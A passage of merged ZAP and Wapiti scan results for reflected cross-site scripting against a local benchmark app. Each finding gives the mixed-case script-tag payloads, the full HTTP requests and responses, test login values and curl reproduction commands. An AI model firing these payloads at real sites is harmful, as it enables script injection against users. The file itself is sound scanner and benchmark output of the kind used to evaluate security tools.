Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00800"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00800?BenchmarkTest00800=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00800.html?BenchmarkTest00800=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00800?username=alice&password=Letm3in_&BenchmarkTest00800=%3CScRiPt%3Ealert%28%27w2vkjzatmx%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:06 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: a and <scrIpt>alert(1);</scRipt>.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:21:51 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: a and <ScRiPt>alert('w2vkjzatmx')</sCrIpT>.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00801?BenchmarkTest00801=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00801?username=alice&password=Letm3in_&BenchmarkTest00801=%3CScRiPt%3Ealert%28%27wfcu2y4df1%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wfcu2y4df1')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wfcu2y4df1')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00801?username=alice&password=Letm3in_&BenchmarkTest00801=%3CScRiPt%3Ealert%28%27wfcu2y4df1%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00801.html?BenchmarkTest00801=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00801"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00801?BenchmarkTest00801=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00801.html?BenchmarkTest00801=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00801?username=alice&password=Letm3in_&BenchmarkTest00801=%3CScRiPt%3Ealert%28%27wfcu2y4df1%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:06 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:51 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wfcu2y4df1')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00802?BenchmarkTest00802=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00802?username=alice&password=Letm3in_&BenchmarkTest00802=%3CScRiPt%3Ealert%28%27w0xbedgqjy%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w0xbedgqjy')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w0xbedgqjy')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00802?username=alice&password=Letm3in_&BenchmarkTest00802=%3CScRiPt%3Ealert%28%27w0xbedgqjy%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00802.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00802"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00802?BenchmarkTest00802=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00802.html?BenchmarkTest00802=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00802?username=alice&password=Letm3in_&BenchmarkTest00802=%3CScRiPt%3Ealert%28%27w0xbedgqjy%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:06 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:51 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w0xbedgqjy')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00803?BenchmarkTest00803=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00803?username=alice&password=Letm3in_&BenchmarkTest00803=%3CScRiPt%3Ealert%28%27w6vw6ixjpu%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w6vw6ixjpu')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w6vw6ixjpu')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00803?username=alice&password=Letm3in_&BenchmarkTest00803=%3CScRiPt%3Ealert%28%27w6vw6ixjpu%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00803.html?BenchmarkTest00803=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00803"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00803?BenchmarkTest00803=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00803.html?BenchmarkTest00803=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00803?username=alice&password=Letm3in_&BenchmarkTest00803=%3CScRiPt%3Ealert%28%27w6vw6ixjpu%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:06 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:51 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w6vw6ixjpu')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00804?BenchmarkTest00804=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00804?username=alice&password=Letm3in_&BenchmarkTest00804=%3CScRiPt%3Ealert%28%27w7a4l7rsmw%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w7a4l7rsmw')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w7a4l7rsmw')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00804?username=alice&password=Letm3in_&BenchmarkTest00804=%3CScRiPt%3Ealert%28%27w7a4l7rsmw%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00804.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00804"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00804?BenchmarkTest00804=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00804.html?BenchmarkTest00804=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00804?username=alice&password=Letm3in_&BenchmarkTest00804=%3CScRiPt%3Ealert%28%27w7a4l7rsmw%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '36', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:06 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '46', 'date': 'Sun, 31 Aug 2025 04:21:52 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w7a4l7rsmw')</sCrIpT>_SafeStuff\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00805?BenchmarkTest00805=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00805?username=alice&password=Letm3in_&BenchmarkTest00805=%3CScRiPt%3Ealert%28%27w7rba7ppsb%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w7rba7ppsb')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w7rba7ppsb')</sCrIpT>"
                ],
